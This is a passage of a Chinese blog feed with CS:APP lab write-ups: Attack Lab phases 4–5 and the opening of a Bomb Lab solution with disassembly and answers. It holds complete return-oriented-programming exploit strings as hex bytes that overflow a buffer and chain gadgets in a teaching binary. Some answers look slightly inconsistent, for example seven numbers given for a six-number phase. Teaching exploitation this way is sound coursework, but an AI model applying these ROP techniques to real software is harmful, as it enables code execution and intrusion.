class="line">  401a11:8d 87 89 ce 90 90    lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a18 &lt;getval_345&gt;:</span><br><span class="line">  401a18:b8 48 89 e0 c1       mov    $0xc1e08948,%eax</span><br><span class="line">  401a1d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a1e &lt;addval_479&gt;:</span><br><span class="line">  401a1e:8d 87 89 c2 00 c9    lea    -0x36ff3d77(%rdi),%eax</span><br><span class="line">  401a24:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a25 &lt;addval_187&gt;:</span><br><span class="line">  401a25:8d 87 89 ce 38 c0    lea    -0x3fc73177(%rdi),%eax</span><br><span class="line">  401a2b:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a2c &lt;setval_248&gt;:</span><br><span class="line">  401a2c:c7 07 81 ce 08 db    movl   $0xdb08ce81,(%rdi)</span><br><span class="line">  401a32:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:b8 89 d1 38 c9       mov    $0xc938d189,%eax</span><br><span class="line">  401a38:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a39 &lt;addval_110&gt;:</span><br><span class="line">  401a39:8d 87 c8 89 e0 c3    lea    -0x3c1f7638(%rdi),%eax</span><br><span class="line">  401a3f:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a40 &lt;addval_487&gt;:</span><br><span class="line">  401a40:8d 87 89 c2 84 c0    lea    -0x3f7b3d77(%rdi),%eax</span><br><span class="line">  401a46:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a47 &lt;addval_201&gt;:</span><br><span class="line">  401a47:8d 87 48 89 e0 c7    lea    -0x381f76b8(%rdi),%eax</span><br><span class="line">  401a4d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a4e &lt;getval_272&gt;:</span><br><span class="line">  401a4e:b8 99 d1 08 d2       mov    $0xd208d199,%eax</span><br><span class="line">  401a53:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a54 &lt;getval_155&gt;:</span><br><span class="line">  401a54:b8 89 c2 c4 c9       mov    $0xc9c4c289,%eax</span><br><span class="line">  401a59:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a5a &lt;setval_299&gt;:</span><br><span class="line">  401a5a:c7 07 48 89 e0 91    movl   $0x91e08948,(%rdi)</span><br><span class="line">  401a60:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a61 &lt;addval_404&gt;:</span><br><span class="line">  401a61:8d 87 89 ce 92 c3    lea    -0x3c6d3177(%rdi),%eax</span><br><span class="line">  401a67:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a68 &lt;getval_311&gt;:</span><br><span class="line">  401a68:b8 89 d1 08 db       mov    $0xdb08d189,%eax</span><br><span class="line">  401a6d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a6e &lt;setval_167&gt;:</span><br><span class="line">  401a6e:c7 07 89 d1 91 c3    movl   $0xc391d189,(%rdi)</span><br><span class="line">  401a74:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a75 &lt;setval_328&gt;:</span><br><span class="line">  401a75:c7 07 81 c2 38 d2    movl   $0xd238c281,(%rdi)</span><br><span class="line">  401a7b:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a7c &lt;setval_450&gt;:</span><br><span class="line">  401a7c:c7 07 09 ce 08 c9    movl   $0xc908ce09,(%rdi)</span><br><span class="line">  401a82:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a83 &lt;addval_358&gt;:</span><br><span class="line">  401a83:8d 87 08 89 e0 90    lea    -0x6f1f76f8(%rdi),%eax</span><br><span class="line">  401a89:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a8a &lt;addval_124&gt;:</span><br><span class="line">  401a8a:8d 87 89 c2 c7 3c    lea    0x3cc7c289(%rdi),%eax</span><br><span class="line">  401a90:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a91 &lt;getval_169&gt;:</span><br><span class="line">  401a91:b8 88 ce 20 c0       mov    $0xc020ce88,%eax</span><br><span class="line">  401a96:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a97 &lt;setval_181&gt;:</span><br><span class="line">  401a97:c7 07 48 89 e0 c2    movl   $0xc2e08948,(%rdi)</span><br><span class="line">  401a9d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a9e &lt;addval_184&gt;:</span><br><span class="line">  401a9e:8d 87 89 c2 60 d2    lea    -0x2d9f3d77(%rdi),%eax</span><br><span class="line">  401aa4:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401aa5 &lt;getval_472&gt;:</span><br><span class="line">  401aa5:b8 8d ce 20 d2       mov    $0xd220ce8d,%eax</span><br><span class="line">  401aaa:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:c7 07 48 89 e0 90    movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401ab2 &lt;end_farm&gt;:</span><br><span class="line">  401ab2:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  401ab7:c3                   retq   </span><br><span class="line">  401ab8:90                   nop</span><br><span class="line">  401ab9:90                   nop</span><br><span class="line">  401aba:90                   nop</span><br><span class="line">  401abb:90                   nop</span><br><span class="line">  401abc:90                   nop</span><br><span class="line">  401abd:90                   nop</span><br><span class="line">  401abe:90                   nop</span><br><span class="line">  401abf:90                   nop</span><br></pre></td></tr></table></figure><ol start="2"><li>rdi要如何设置为cookie</li><li>如何跳转到touch2</li></ol><p>我将所有可以用的指令都高亮了出来, 根据提示, 我们只需要只用Figure A和Figure B中的指令即可. 这里能够修改的rdi的只有:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov $rax, $rdi</span><br></pre></td></tr></table></figure><p>那问题转到$rax了,再看能修改$rax的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $rsp, $rax </span><br><span class="line">pop $rax</span><br></pre></td></tr></table></figure><p>显然,用pop的概率更大.</p><p>pop是将$rsp当前指向的数据  pop 到 $rax 上, 所以我们可得gaddget如下图:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093518556.png" alt="image-20200721093518556"></p><p>知道这些, 我们只用到 rtaget的gaddgets_farm中找到对应的指令字节码即可, 最终可得:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 先填充40个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8个字节 *&#x2F;</span><br><span class="line">&#x2F;* 写入gadgets *&#x2F;</span><br><span class="line">ab 19 40 00 00 00 00 00 &#x2F;* pop $rax *&#x2F;</span><br><span class="line">fa 97 b9 59 00 00 00 00 &#x2F;* cookie *&#x2F;</span><br><span class="line">a2 19 40 00 00 00 00 00 &#x2F;* mov $rax,$rdi *&#x2F;</span><br><span class="line">ec 17 40 00 00 00 00 00 &#x2F;* touch2 地址 *&#x2F;</span><br></pre></td></tr></table></figure><h2 id="5-Phase-5"><a href="#5-Phase-5" class="headerlink" title="5. Phase 5"></a>5. Phase 5</h2><p>Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string epresentation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.</p><p>To solve Phase 5, you can use gadgets in the region of the code in rtarget demarcated by functions start_farm and end_farm. In addition to the gadgets used in Phase 4, this expanded farm includes the encodings of different movl instructions, as shown in Figure 3C. The byte sequences in this part of the farm also contain 2-byte instructions that serve as functional nops, i.e., they do not change any register or memory values. These include instructions, shown in Figure 3D, such as andb %al,%al, that operate on the low-order bytes of some of the registers but do not change their values.</p><p>这个题目的确是个比较坑的题目, 因为从前文做到现在, 很容易让人联想到, 我所有需要的gaddgets都是依据表格中给出的指令, 然后到farm对比中得到的.  如果你是这样想的, 那肯定是做不出来的了. 因为你会发现, 不论怎么做, 你都无法使rdi指向 cookie的string数据内存地址. </p><p>本题的关键是如下这段代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:c3                   retq   </span><br></pre></td></tr></table></figure><p>lea指令, 实现了相加功能, 一旦能实现相加功能, 我们就能使 rdi = cookie 的string内存地址了. 至于为什么, 我们一步步分析.</p><p>本题起始就是phase3的rop版. 回忆下phase3中我们要做的工作的几个关键点:</p><ol><li>cooike的 string ascii码表示</li><li>cooike的string ascii码的存放以及 <strong>存放位置的确定</strong></li><li>rdi指向 string 的存放地址.</li><li>touch3跳转</li></ol><p>回忆以下我们在phase3中是怎么做的?看看下面的示意图.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f16832c14195aa594b36a03.png" alt="image-20200721091909441"></p><p>从这张图中, 我们可以考虑一下如果运用aop , string到底放在哪里合适? 我们的前提是任何时候都不能覆盖string.</p><p><strong>显然 string 依然应该放内存中的最高位. 因为栈是往下push的.</strong> </p><p>好, 那什么时候跳转到touch3? </p><p>当然是我们确定rdi已经指向了string 内存地址之后.</p><p>所以touch3 应该在 rdi赋值 指令之后.</p><p>现在唯一的问题就剩下, rdi如何赋值?</p><p>这时候就需要逆向思维了, 查看表格, 能够修改rdi的有哪些?</p><p>仅有两条:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $rax, $rdi</span><br><span class="line">movl $eax, $edi</span><br></pre></td></tr></table></figure><p>要知道, mov是将一个寄存器的值直接赋值给另一个寄存器的, 而在本次实验中, stack是随机化的, 我们不可能固定 string 字符串的内存位置, <strong>所以可以使用相对偏移量来做</strong>, 我们能确定的是getbuf函数返回后, $rsp的位置. 那么有:<br>$$<br>cookie_value_address = $rsp + offset<br>$$<br>应该注意到, $rdi一定会在最后被赋值一次, 因为rdi才是函数调用的第一个参数. 那如果去构造上面这个公式呢? 这就又需要逆向思维了?</p><p>谁能修改 rdi? –&gt; rax可以.</p><p>谁能修该 rax? –&gt; rsp 和 pop指令</p><p>rax可以修改谁? –&gt; 可以修改rdi, edx</p><p>edx可以修改谁? –&gt;  可以修改ecx</p><p>ecx可以修改谁? –&gt; 可以修改esi</p><p>再结合前文的lea指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea    (%rdi,%rsi,1),%rax</span><br></pre></td></tr></table></figure><p>rax = rdi + rsi</p><p>这样, 所有的条件都凑齐了.</p><p>画个示意图:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721100554201.png" alt="image-20200721100554201"></p><p>于是可以有攻击代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 前0x28个字符填充0x00 *&#x2F;</span><br><span class="line">06 1a 40 00 00 00 00 00 &#x2F;* mov $rsp,$rax *&#x2F;</span><br><span class="line">c5 19 40 00 00 00 00 00 &#x2F;* mov $rax,$rdi *&#x2F;</span><br><span class="line">ab 19 40 00 00 00 00 00 &#x2F;* pop $rax *&#x2F;</span><br><span class="line">48 00 00 00 00 00 00 00 &#x2F;* offset *&#x2F;</span><br><span class="line">dd 19 40 00 00 00 00 00 &#x2F;* movl $eax,$edx *&#x2F;</span><br><span class="line">34 1a 40 00 00 00 00 00 &#x2F;* movl $edx,$ecx *&#x2F;</span><br><span class="line">63 1a 40 00 00 00 00 00 &#x2F;* movl $ecx,$esi *&#x2F;</span><br><span class="line">d6 19 40 00 00 00 00 00 &#x2F;* lea (%rdi,%rsi,1),%rax *&#x2F;</span><br><span class="line">a2 19 40 00 00 00 00 00 &#x2F;* mov $rax,$rdi *&#x2F;</span><br><span class="line">fa 18 40 00 00 00 00 00 &#x2F;* touch3 地址 *&#x2F;</span><br><span class="line">35 39 62 39 39 37 66 61 00 &#x2F;* cookie value *&#x2F;</span><br></pre></td></tr></table></figure><p>一个小tip: offset不用手算, 最先可以随便设置一个值,gdb debug到进入到我们的注入代码时候, 执行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x &#x2F;100xb $rsp</span><br></pre></td></tr></table></figure><p>就可以看到cooike value所在的内存地址, 然后 用这个地址 - $rsp即可得到offset, 最后再修改一次攻击代码即可.</p><h2 id="6-尾语"><a href="#6-尾语" class="headerlink" title="6. 尾语"></a>6. 尾语</h2><p>这一个实验和上一个bomlab实验隔了整整一个月才做, 不过整体坐下来比bomblab简单得多, 总体来说, 加强了gdb调试能力, 加深对函数调用的过程, 了解了一些常用的代码注入攻击手段, 能够帮助我们写出更安全,健壮的代码.</p>]]></content>
      
      
      <categories>
          
          <category> Csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attacklab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Csapp-Bomblab题解</title>
      <link href="/archives/7915569e.html"/>
      <url>/archives/7915569e.html</url>
      
        <content type="html"><![CDATA[<p>今天继续学习csapp.</p><p>前一个lab: <a href="https://www.ravenxrz.ink/archives/2d758396.html">Csapp-Datalab 详解 </a></p><p>本次lab, bomblab.</p><h2 id="0-说明"><a href="#0-说明" class="headerlink" title="0. 说明"></a>0. 说明</h2><p> 这个实验相当好玩, 题如其名, 类似一个拆炸弹的过程. 实验只给了一个可执行文件, 需要学生通过gdb反汇编这个可执行文件, “拆弹”共有6个阶段, 每个阶段需要用户输入一个特定的字符串, 一旦输入错误, 炸弹就会爆炸,程序终止.</p><p>做完整个实验, <strong>学生可以学会如何使用gdb, 能够看懂 gcc所编译出来的汇编代码. 掌握阅读汇编代码的能力.</strong></p><p>gdb的使用可参考: <a href="https://www.ravenxrz.ink/archives/37784c45.html">gdb 调试基础 </a></p><p><strong>本次解释, 均已代码注释+图形解释.</strong></p><p><strong>所有汇编代码, 可通过 objdump -d bomb获得.</strong></p><a id="more"></a><h2 id="1-phase-1"><a href="#1-phase-1" class="headerlink" title="1. phase 1"></a>1. phase 1</h2><p>下面是phase 1的汇编代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">   400ee0:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">   400ee4:   be 00 24 40 00          mov    $0x402400,%esi             ; 0x402400是重点</span><br><span class="line">   400ee9:   e8 4a 04 00 00          callq  401338 &lt;strings_not_equal&gt; ; 根据函数可知, 这里要比较两个字符串是否相同</span><br><span class="line">   400eee:   85 c0                   test   %eax,%eax</span><br><span class="line">   400ef0:   74 05                   je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">   400ef2:   e8 43 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">   400ef7:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">   400efb:   c3                      retq   </span><br></pre></td></tr></table></figure><p>所以,我们需要查看内存地址 0x402400的字符串是什么, 通过 <code>x /100cb 0x402400</code>命令,可得:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200621205547340.png" alt="image-20200621205547340"></p><p>找到 <code>\0</code>的位置, 之前所有的字符组成的字符串即为答案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br></pre></td></tr></table></figure><h2 id="2-phase-2"><a href="#2-phase-2" class="headerlink" title="2. phase 2"></a>2. phase 2</h2><p>源代码和注释:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:   55                      push   %rbp</span><br><span class="line">  400efd:   53                      push   %rbx</span><br><span class="line">  400efe:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  400f02:   48 89 e6                mov    %rsp,%rsi</span><br><span class="line">  400f05:   e8 52 05 00 00          callq  40145c &lt;read_six_numbers&gt;    ;重点在这个函数, 内部采用sscanf实现</span><br><span class="line">  400f0a:   83 3c 24 01             cmpl   $0x1,(%rsp)                  ;输入的第一值必须为1</span><br><span class="line">  400f0e:   74 20                   je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:   e8 25 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:   eb 19                   jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:   8b 43 fc                mov    -0x4(%rbx),%eax              ; 这里为 x_&#123;i&#125;</span><br><span class="line">  400f1a:   01 c0                   add    %eax,%eax                    ; x_&#123;i&#125;&#x3D;2*x_&#123;i&#125;,将当前值加倍</span><br><span class="line">  400f1c:   39 03                   cmp    %eax,(%rbx)                  ; 这里 为x_&#123;i+1&#125;, </span><br><span class="line">  400f1e:   74 05                   je     400f25 &lt;phase_2+0x29&gt;        ; 要求 x_&#123;i+1&#125; &#x3D; x&#123;i&#125;, 结合这三行代码, 要求为,上一个数的2倍&#x3D;下一个数 </span><br><span class="line">  400f20:   e8 15 05 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:   48 83 c3 04             add    $0x4,%rbx</span><br><span class="line">  400f29:   48 39 eb                cmp    %rbp,%rbx</span><br><span class="line">  400f2c:   75 e9                   jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:   eb 0c                   jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:   48 8d 5c 24 04          lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:   48 8d 6c 24 18          lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:   eb db                   jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  400f40:   5b                      pop    %rbx</span><br><span class="line">  400f41:   5d                      pop    %rbp</span><br><span class="line">  400f42:   c3                      retq                                                </span><br></pre></td></tr></table></figure><p>这个题的重点有两个:</p><ol><li>函数 read_sim_numers. 内部sscanf实现. 从函数名也可一直,本题要求输入值的数量为6.</li><li>指令地址 0x400f17开始的地方, 结合这里的4行代码, 可以推断,本题要求输入值的约束为:</li></ol><p>$$<br>x_{i} \times 2 = x_{i+1} \quad i = {0\dots5}<br>$$</p><p>且 0x400f0a要求第一个参数为1.</p><p>所以,答案为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 2 4 8 16 32 64</span><br></pre></td></tr></table></figure><h2 id="3-phase-3"><a href="#3-phase-3" class="headerlink" title="3. phase 3"></a>3. phase 3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:   48 83 ec 18             sub    $0x18,%rsp</span><br><span class="line">  400f47:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:   be cf 25 40 00          mov    $0x4025cf,%esi</span><br><span class="line">  400f56:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400f5b:   e8 90 fc ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:   83 f8 01                cmp    $0x1,%eax            ; 输入参数的数量应该&gt;1</span><br><span class="line">  400f63:   7f 05                   jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:   e8 d0 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:   83 7c 24 08 07          cmpl   $0x7,0x8(%rsp)       ; 0x80(rsp)地址空间的value : 0x7</span><br><span class="line">  400f6f:   77 3c                   ja     400fad &lt;phase_3+0x6a&gt; ; 是否符号小</span><br><span class="line">  400f71:   8b 44 24 08             mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:   ff 24 c5 70 24 40 00    jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:   b8 cf 00 00 00          mov    $0xcf,%eax</span><br><span class="line">  400f81:   eb 3b                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:   b8 c3 02 00 00          mov    $0x2c3,%eax</span><br><span class="line">  400f88:   eb 34                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:   b8 00 01 00 00          mov    $0x100,%eax</span><br><span class="line">  400f8f:   eb 2d                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:   b8 85 01 00 00          mov    $0x185,%eax</span><br><span class="line">  400f96:   eb 26                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:   b8 ce 00 00 00          mov    $0xce,%eax</span><br><span class="line">  400f9d:   eb 1f                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:   b8 aa 02 00 00          mov    $0x2aa,%eax</span><br><span class="line">  400fa4:   eb 18                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:   b8 47 01 00 00          mov    $0x147,%eax</span><br><span class="line">  400fab:   eb 11                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:   e8 88 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  400fb7:   eb 05                   jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:   b8 37 01 00 00          mov    $0x137,%eax          </span><br><span class="line">  400fbe:   3b 44 24 0c             cmp    0xc(%rsp),%eax       ; 0x137 : 0x($rsp) , 通过x打印命令,可知0x($rsp)就是要求输入的第二参数</span><br><span class="line">  400fc2:   74 05                   je     400fc9 &lt;phase_3+0x86&gt; ; 所以第二参数为0x137</span><br><span class="line">  400fc4:   e8 71 04 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">  400fcd:   c3                      retq </span><br></pre></td></tr></table></figure><p>这里注意三个点:</p><ol><li>输入的字段数&gt;1</li><li>第二个参数为0x137, 在指令地址为0x400fbe地方可见.</li></ol><p>答案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 311</span><br></pre></td></tr></table></figure><h2 id="4-phase-4"><a href="#4-phase-4" class="headerlink" title="4. phase 4"></a>4. phase 4</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">   400fce:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">   400fd2:   89 d0                   mov    %edx,%eax</span><br><span class="line">   400fd4:   29 f0                   sub    %esi,%eax            ; 第一次, eax&#x3D;17; 第二次进入, </span><br><span class="line">   400fd6:   89 c1                   mov    %eax,%ecx            ; 第一次进入时, ecx &#x3D; 14</span><br><span class="line">   400fd8:   c1 e9 1f                shr    $0x1f,%ecx           ; 第一次进入时, ecx &#x3D; 0</span><br><span class="line">   400fdb:   01 c8                   add    %ecx,%ea</span><br><span class="line">   400fdd:   d1 f8                   sar    %eax                 ; 第一次进入时, ecx &#x3D; 7</span><br><span class="line">   400fdf:   8d 0c 30                lea    (%rax,%rsi,1),%ecx   ; 第一次进入时, ecx &#x3D; 7</span><br><span class="line">   400fe2:   39 f9                   cmp    %edi,%ecx            ; ecx : edi</span><br><span class="line">   400fe4:   7e 0c                   jle    400ff2 &lt;func4+0x24&gt;  ; ecx &lt;&#x3D; edi</span><br><span class="line">   400fe6:   8d 51 ff                lea    -0x1(%rcx),%edx      ; 第一次进入,ecdx &#x3D; 6</span><br><span class="line">   400fe9:   e8 e0 ff ff ff          callq  400fce &lt;func4&gt;       ; 递归调用</span><br><span class="line">   400fee:   01 c0                   add    %eax,%eax            </span><br><span class="line">   400ff0:   eb 15                   jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">   400ff2:   b8 00 00 00 00          mov    $0x0,%eax           ; eax  &#x3D; 0 </span><br><span class="line">   400ff7:   39 f9                   cmp    %edi,%ecx           ; ecx : edi</span><br><span class="line">   400ff9:   7d 0c                   jge    401007 &lt;func4+0x39&gt; ; ecx &gt;&#x3D; edi 结合上面 ecx &lt;&#x3D;edi &#x3D;&#x3D;&gt; ecx &#x3D; edi, 最后一层应该在这里返回, 而前文已经推断得到ecx&#x3D;7</span><br><span class="line">   400ffb:   8d 71 01                lea    0x1(%rcx),%esi</span><br><span class="line">   400ffe:   e8 cb ff ff ff          callq  400fce &lt;func4&gt;</span><br><span class="line">   401003:   8d 44 00 01             lea    0x1(%rax,%rax,1),%eax    ; 最后一层返回eax时,eax 应该&#x3D;0</span><br><span class="line">   401007:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">   40100b:   c3                      retq</span><br><span class="line">   </span><br><span class="line"> 000000000040100c &lt;phase_4&gt;:</span><br><span class="line">   40100c:   48 83 ec 18             sub    